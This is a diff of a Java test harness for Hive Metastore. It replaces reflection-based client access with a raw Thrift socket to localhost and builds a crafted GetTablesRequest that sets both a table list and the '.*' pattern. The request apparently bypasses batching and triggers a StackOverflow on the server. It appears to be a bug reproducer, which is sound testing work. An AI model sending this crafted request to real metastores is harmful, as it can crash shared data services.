@@ -15,7 +15,6 @@
  */
 package com.github.raghav;
 
-import java.lang.reflect.Field;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.HashMap;
@@ -34,7 +33,9 @@ import org.apache.hadoop.hive.metastore.api.StorageDescriptor;
 import org.apache.hadoop.hive.metastore.api.Table;
 import org.apache.hadoop.hive.metastore.api.ThriftHiveMetastore;
 import org.apache.hadoop.hive.metastore.conf.MetastoreConf;
-import org.apache.thrift.TException;
+import org.apache.thrift.protocol.TBinaryProtocol;
+import org.apache.thrift.transport.TSocket;
+import org.apache.thrift.transport.TTransport;
 
 public class ConcurrentHMSTesting {
 
@@ -160,20 +161,36 @@ public class ConcurrentHMSTesting {
     long startGet = System.currentTimeMillis();
 
     try {
-      // 1. Get the private thriftClient field from HiveMetaStoreClient
-      List<String> tables = refGetTables(mainClient);
+      // 1. Open raw Thrift transport to the running HMS
+      TTransport transport = new TSocket("localhost", 9083);
 
-      long endGet = System.currentTimeMillis();
-      System.out.println(
-          "SUCCESS: Retrieved "
-              + tables.size()
-              + " table names via raw get_tables() in "
-              + (endGet - startGet)
-              + " ms.");
+      try (transport) {
+        transport.open();
+        ThriftHiveMetastore.Client rawThriftClient =
+            new ThriftHiveMetastore.Client(new TBinaryProtocol(transport));
+        List<String> tables = rawThriftClient.get_tables(DB_NAME, ".*");
 
-      System.out.println("Now running getTableObjectsByName (this triggers StackOverflow)...");
-      List<Table> tableObjects = mainClient.getTableObjectsByName(DB_NAME, tables);
-      System.out.println("Fetched " + tableObjects.size() + " full table objects.");
+        long endGet = System.currentTimeMillis();
+        System.out.println(
+            "SUCCESS: Retrieved "
+                + tables.size()
+                + " table names via raw get_tables() in "
+                + (endGet - startGet)
+                + " ms.");
+
+        System.out.println(
+            "Now manually calling get_table_objects_by_name_req with BOTH list and pattern (this triggers StackOverflow!)...");
+
+        // 2. Build the malicious GetTablesRequest
+        org.apache.hadoop.hive.metastore.api.GetTablesRequest req =
+            new org.apache.hadoop.hive.metastore.api.GetTablesRequest(DB_NAME);
+        req.setTblNames(tables);
+        req.setTablesPattern(".*"); // The smoking gun that bypasses batching!
+
+        // 3. Execute it!
+        List<Table> tableObjects = rawThriftClient.get_table_objects_by_name_req(req).getTables();
+        System.out.println("Fetched " + tableObjects.size() + " full table objects.");
+      }
 
     } catch (Exception e) {
       System.err.println("API call failed with exception:");
@@ -183,24 +200,6 @@ public class ConcurrentHMSTesting {
     // 5. Cleanup
     mainClient.close();
     System.out.println("Shutdown complete.");
-  }
-
-  private static List<String> refGetTables(HiveMetaStoreClient mainClient)
-      throws NoSuchFieldException, IllegalAccessException, TException {
-    Field thriftClientField = mainClient.getClass().getDeclaredField("thriftClient");
-    thriftClientField.setAccessible(true);
-    Object thriftClientObj = thriftClientField.get(mainClient);
-
-    // 2. Get the private client field from ThriftHiveMetaStoreClient
-    Field clientField = thriftClientObj.getClass().getDeclaredField("client");
-    clientField.setAccessible(true);
-
-    // 3. Extract the raw Thrift Interface
-    ThriftHiveMetastore.Iface rawThriftClient =
-        (ThriftHiveMetastore.Iface) clientField.get(thriftClientObj);
-
-    // 3. Directly invoke the raw get_tables API!
-    return rawThriftClient.get_tables(DB_NAME, ".*");
   }
 
   /** Helper to build a minimal valid HMS Table object in Parquet format. */
